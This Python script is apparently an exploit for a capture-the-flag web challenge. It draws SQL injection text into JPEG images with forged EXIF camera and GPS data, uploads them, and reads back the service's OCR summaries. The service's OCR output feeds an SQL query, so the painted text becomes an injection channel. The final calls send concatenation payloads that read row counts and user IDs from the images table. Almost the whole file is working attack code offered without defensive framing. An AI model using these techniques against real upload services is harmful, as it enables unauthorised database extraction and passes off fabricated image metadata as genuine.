# v2_see_from.py — injection works (sqlite_version executed). But queries with FROM/images/spaces
# give 500 => the OCR misreads those. To fix, we must SEE how OCR renders 'FROM images' and pick a
# spacing/wording the OCR reproduces exactly. Trick: embed the words INSIDE a string literal that
# gets stored, so the query stays valid (200) and we can read what OCR made of them.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):
    W=min(2400,max(1000,40+int(len(text)*size*0.55))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("sf.jpg","jpeg",quality=75,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"sf.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("sf.jpg","rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    print(f"{desc:16} {r.status_code} ocr={ocr!r}")
    return ocr

q="'"
# Put the words as PLAIN TEXT (no injection) so it always stores; see how OCR renders them.
print("=== how does OCR read the SQL keywords? (plain text, always 200) ===")
up("SELECT count star FROM images test", "words_plain")
up("FROM images", "just_from")
up("aFROMb aimagesb", "from_glued")
up("SELECT/**/x/**/FROM", "slashstar")
print()
# Now injected versions to compare which SHAPE keeps 200 (executes) with a table read.
# Use double-quote-less, try 'FROM"images"' style and bracket identifiers [images]:
print("=== injected table reads, different identifier styles ===")
up("9"+q+"||(SELECT(count(*))FROM(images))||"+q+"9", "parens_from")   # FROM(images) no space
up("9"+q+"||(SELECT(user_id)FROM(images)LIMIT(1))||"+q+"9", "parens_uid")
